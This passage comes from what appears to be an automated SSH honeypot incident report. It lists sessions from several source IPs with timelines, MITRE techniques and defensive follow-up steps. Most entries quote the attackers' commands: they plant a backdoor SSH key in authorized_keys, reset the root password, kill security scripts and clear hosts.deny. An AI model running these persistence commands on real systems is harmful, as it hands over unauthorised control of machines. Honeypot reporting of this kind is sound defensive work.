| `2026-04-12 20:10:30` | `cowrie.session.params` |
| `2026-04-12 20:10:30` | `cowrie.command.input` |
| `2026-04-12 20:10:30` | `cowrie.log.closed` |
| `2026-04-12 20:10:30` | `cowrie.session.params` |
| `2026-04-12 20:10:30` | `cowrie.command.input` |
| `2026-04-12 20:10:31` | `cowrie.log.closed` |
| `2026-04-12 20:10:31` | `cowrie.session.params` |
| `2026-04-12 20:10:31` | `cowrie.command.input` |
| `2026-04-12 20:10:31` | `cowrie.log.closed` |
| `2026-04-12 20:10:31` | `cowrie.session.params` |
| `2026-04-12 20:10:31` | `cowrie.command.input` |
| `2026-04-12 20:10:31` | `cowrie.log.closed` |
| `2026-04-12 20:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]124` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b5e135fa5d

| Field | Detail |
|---|---|
| **Source IP** | `178.217.169[.]240` |
| **First Seen** | 2026-04-12 20:11 |
| **Last Seen** | 2026-04-12 20:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:11:38` | `cowrie.session.connect` |
| `2026-04-12 20:11:38` | `cowrie.client.version` |
| `2026-04-12 20:11:39` | `cowrie.client.kex` |
| `2026-04-12 20:11:40` | `cowrie.login.success` |
| `2026-04-12 20:11:40` | `cowrie.session.params` |
| `2026-04-12 20:11:40` | `cowrie.command.input` |
| `2026-04-12 20:11:40` | `cowrie.command.failed` |
| `2026-04-12 20:11:40` | `cowrie.log.closed` |
| `2026-04-12 20:11:41` | `cowrie.session.params` |
| `2026-04-12 20:11:41` | `cowrie.command.input` |
| `2026-04-12 20:11:41` | `cowrie.session.file_download` |
| `2026-04-12 20:11:41` | `cowrie.log.closed` |
| `2026-04-12 20:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.217.169[.]240` to AbuseIPDB if not already reported
- [ ] Block `178.217.169[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab980b77f4d

| Field | Detail |
|---|---|
| **Source IP** | `178.217.169[.]240` |
| **First Seen** | 2026-04-12 20:11 |
| **Last Seen** | 2026-04-12 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:11:44` | `cowrie.session.connect` |
| `2026-04-12 20:11:44` | `cowrie.client.version` |
| `2026-04-12 20:11:44` | `cowrie.client.kex` |
| `2026-04-12 20:11:45` | `cowrie.login.success` |
| `2026-04-12 20:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.217.169[.]240` to AbuseIPDB if not already reported
- [ ] Block `178.217.169[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f331ad5ade5

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:12 |
| **Last Seen** | 2026-04-12 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:12:14` | `cowrie.session.connect` |
| `2026-04-12 20:12:14` | `cowrie.client.version` |
| `2026-04-12 20:12:14` | `cowrie.client.kex` |
| `2026-04-12 20:12:15` | `cowrie.login.success` |
| `2026-04-12 20:12:15` | `cowrie.session.params` |
| `2026-04-12 20:12:15` | `cowrie.command.input` |
| `2026-04-12 20:12:15` | `cowrie.command.failed` |
| `2026-04-12 20:12:15` | `cowrie.log.closed` |
| `2026-04-12 20:12:15` | `cowrie.session.params` |
| `2026-04-12 20:12:15` | `cowrie.command.input` |
| `2026-04-12 20:12:16` | `cowrie.session.file_download` |
| `2026-04-12 20:12:16` | `cowrie.log.closed` |
| `2026-04-12 20:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9259cda95896

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:12 |
| **Last Seen** | 2026-04-12 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:12:17` | `cowrie.session.connect` |
| `2026-04-12 20:12:17` | `cowrie.client.version` |
| `2026-04-12 20:12:17` | `cowrie.client.kex` |
| `2026-04-12 20:12:18` | `cowrie.login.success` |
| `2026-04-12 20:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff1847410f8

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:13 |
| **Last Seen** | 2026-04-12 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:13:47` | `cowrie.session.connect` |
| `2026-04-12 20:13:47` | `cowrie.client.version` |
| `2026-04-12 20:13:47` | `cowrie.client.kex` |
| `2026-04-12 20:13:47` | `cowrie.login.success` |
| `2026-04-12 20:13:48` | `cowrie.session.params` |
| `2026-04-12 20:13:48` | `cowrie.command.input` |
| `2026-04-12 20:13:48` | `cowrie.command.failed` |
| `2026-04-12 20:13:48` | `cowrie.log.closed` |
| `2026-04-12 20:13:48` | `cowrie.session.params` |
| `2026-04-12 20:13:48` | `cowrie.command.input` |
| `2026-04-12 20:13:48` | `cowrie.session.file_download` |
| `2026-04-12 20:13:48` | `cowrie.log.closed` |
| `2026-04-12 20:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecdc37f84b12

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:13 |
| **Last Seen** | 2026-04-12 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:13:50` | `cowrie.session.connect` |
| `2026-04-12 20:13:50` | `cowrie.client.version` |
| `2026-04-12 20:13:50` | `cowrie.client.kex` |
| `2026-04-12 20:13:51` | `cowrie.login.success` |
| `2026-04-12 20:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32df1f493be

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:15 |
| **Last Seen** | 2026-04-12 20:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:15:24` | `cowrie.session.connect` |
| `2026-04-12 20:15:24` | `cowrie.client.version` |
| `2026-04-12 20:15:24` | `cowrie.client.kex` |
| `2026-04-12 20:15:25` | `cowrie.login.success` |
| `2026-04-12 20:15:25` | `cowrie.session.params` |
| `2026-04-12 20:15:25` | `cowrie.command.input` |
| `2026-04-12 20:15:25` | `cowrie.command.failed` |
| `2026-04-12 20:15:25` | `cowrie.log.closed` |
| `2026-04-12 20:15:25` | `cowrie.session.params` |
| `2026-04-12 20:15:25` | `cowrie.command.input` |
| `2026-04-12 20:15:26` | `cowrie.session.file_download` |
| `2026-04-12 20:15:26` | `cowrie.log.closed` |
| `2026-04-12 20:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a25eb587efe

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:15 |
| **Last Seen** | 2026-04-12 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:15:27` | `cowrie.session.connect` |
| `2026-04-12 20:15:27` | `cowrie.client.version` |
| `2026-04-12 20:15:28` | `cowrie.client.kex` |
| `2026-04-12 20:15:28` | `cowrie.login.success` |
| `2026-04-12 20:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0557895ec742

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:17 |
| **Last Seen** | 2026-04-12 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:17:03` | `cowrie.session.connect` |
| `2026-04-12 20:17:03` | `cowrie.client.version` |
| `2026-04-12 20:17:03` | `cowrie.client.kex` |
| `2026-04-12 20:17:04` | `cowrie.login.success` |
| `2026-04-12 20:17:04` | `cowrie.session.params` |
| `2026-04-12 20:17:04` | `cowrie.command.input` |
| `2026-04-12 20:17:04` | `cowrie.command.failed` |
| `2026-04-12 20:17:04` | `cowrie.log.closed` |
| `2026-04-12 20:17:04` | `cowrie.session.params` |
| `2026-04-12 20:17:04` | `cowrie.command.input` |
| `2026-04-12 20:17:04` | `cowrie.session.file_download` |
| `2026-04-12 20:17:04` | `cowrie.log.closed` |
| `2026-04-12 20:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2b601b1272

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:17 |
| **Last Seen** | 2026-04-12 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:17:06` | `cowrie.session.connect` |
| `2026-04-12 20:17:06` | `cowrie.client.version` |
| `2026-04-12 20:17:06` | `cowrie.client.kex` |
| `2026-04-12 20:17:07` | `cowrie.login.success` |
| `2026-04-12 20:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20ab311e1c2

| Field | Detail |
|---|---|
| **Source IP** | `36.134.203[.]156` |
| **First Seen** | 2026-04-12 20:17 |
| **Last Seen** | 2026-04-12 20:18 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0VQEfo5Y16CP"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:17:51` | `cowrie.session.connect` |
| `2026-04-12 20:17:51` | `cowrie.client.version` |
| `2026-04-12 20:17:51` | `cowrie.client.kex` |
| `2026-04-12 20:17:56` | `cowrie.login.success` |
| `2026-04-12 20:17:56` | `cowrie.session.params` |
| `2026-04-12 20:17:56` | `cowrie.command.input` |
| `2026-04-12 20:17:56` | `cowrie.command.failed` |
| `2026-04-12 20:17:57` | `cowrie.log.closed` |
| `2026-04-12 20:17:57` | `cowrie.session.params` |
| `2026-04-12 20:17:57` | `cowrie.command.input` |
| `2026-04-12 20:17:57` | `cowrie.session.file_download` |
| `2026-04-12 20:17:57` | `cowrie.log.closed` |
| `2026-04-12 20:18:09` | `cowrie.session.params` |
| `2026-04-12 20:18:09` | `cowrie.command.input` |
| `2026-04-12 20:18:10` | `cowrie.log.closed` |
| `2026-04-12 20:18:10` | `cowrie.session.params` |
| `2026-04-12 20:18:10` | `cowrie.command.input` |
| `2026-04-12 20:18:10` | `cowrie.log.closed` |
| `2026-04-12 20:18:11` | `cowrie.session.params` |
| `2026-04-12 20:18:11` | `cowrie.command.input` |
| `2026-04-12 20:18:11` | `cowrie.session.file_download` |
| `2026-04-12 20:18:11` | `cowrie.log.closed` |
| `2026-04-12 20:18:11` | `cowrie.session.params` |
| `2026-04-12 20:18:11` | `cowrie.command.input` |
| `2026-04-12 20:18:11` | `cowrie.log.closed` |
| `2026-04-12 20:18:12` | `cowrie.session.params` |
| `2026-04-12 20:18:12` | `cowrie.command.input` |
| `2026-04-12 20:18:12` | `cowrie.log.closed` |
| `2026-04-12 20:18:12` | `cowrie.session.params` |
| `2026-04-12 20:18:12` | `cowrie.command.input` |
| `2026-04-12 20:18:12` | `cowrie.command.input` |
| `2026-04-12 20:18:12` | `cowrie.log.closed` |
| `2026-04-12 20:18:13` | `cowrie.session.params` |
| `2026-04-12 20:18:13` | `cowrie.command.input` |
| `2026-04-12 20:18:13` | `cowrie.log.closed` |
| `2026-04-12 20:18:13` | `cowrie.session.params` |
| `2026-04-12 20:18:13` | `cowrie.command.input` |
| `2026-04-12 20:18:14` | `cowrie.log.closed` |
| `2026-04-12 20:18:14` | `cowrie.session.params` |
| `2026-04-12 20:18:14` | `cowrie.command.input` |
| `2026-04-12 20:18:14` | `cowrie.log.closed` |
| `2026-04-12 20:18:15` | `cowrie.session.params` |
| `2026-04-12 20:18:15` | `cowrie.command.input` |
| `2026-04-12 20:18:15` | `cowrie.log.closed` |
| `2026-04-12 20:18:15` | `cowrie.session.params` |
| `2026-04-12 20:18:15` | `cowrie.command.input` |
| `2026-04-12 20:18:15` | `cowrie.log.closed` |
| `2026-04-12 20:18:16` | `cowrie.session.params` |
| `2026-04-12 20:18:16` | `cowrie.command.input` |
| `2026-04-12 20:18:16` | `cowrie.log.closed` |
| `2026-04-12 20:18:16` | `cowrie.session.params` |
| `2026-04-12 20:18:16` | `cowrie.command.input` |
| `2026-04-12 20:18:17` | `cowrie.log.closed` |
| `2026-04-12 20:18:17` | `cowrie.session.params` |
| `2026-04-12 20:18:17` | `cowrie.command.input` |
| `2026-04-12 20:18:17` | `cowrie.log.closed` |
| `2026-04-12 20:18:18` | `cowrie.session.params` |
| `2026-04-12 20:18:18` | `cowrie.command.input` |
| `2026-04-12 20:18:18` | `cowrie.log.closed` |
| `2026-04-12 20:18:18` | `cowrie.session.params` |
| `2026-04-12 20:18:18` | `cowrie.command.input` |
| `2026-04-12 20:18:18` | `cowrie.log.closed` |
| `2026-04-12 20:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.134.203[.]156` to AbuseIPDB if not already reported
- [ ] Block `36.134.203[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16be7dc08c2a

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:20 |
| **Last Seen** | 2026-04-12 20:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:20:16` | `cowrie.session.connect` |
| `2026-04-12 20:20:16` | `cowrie.client.version` |
| `2026-04-12 20:20:16` | `cowrie.client.kex` |
| `2026-04-12 20:20:17` | `cowrie.login.success` |
| `2026-04-12 20:20:17` | `cowrie.session.params` |
| `2026-04-12 20:20:17` | `cowrie.command.input` |
| `2026-04-12 20:20:17` | `cowrie.command.failed` |
| `2026-04-12 20:20:17` | `cowrie.log.closed` |
| `2026-04-12 20:20:17` | `cowrie.session.params` |
| `2026-04-12 20:20:17` | `cowrie.command.input` |
| `2026-04-12 20:20:17` | `cowrie.session.file_download` |
| `2026-04-12 20:20:17` | `cowrie.log.closed` |
| `2026-04-12 20:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc4d64cb6ee

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:20 |
| **Last Seen** | 2026-04-12 20:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:20:19` | `cowrie.session.connect` |
| `2026-04-12 20:20:19` | `cowrie.client.version` |
| `2026-04-12 20:20:19` | `cowrie.client.kex` |
| `2026-04-12 20:20:20` | `cowrie.login.success` |
| `2026-04-12 20:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]248` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e219765cad

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]248` |
| **First Seen** | 2026-04-12 20:21 |
| **Last Seen** | 2026-04-12 20:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 20:21:55` | `cowrie.session.connect` |
| `2026-04-12 20:21:55` | `cowrie.client.version` |
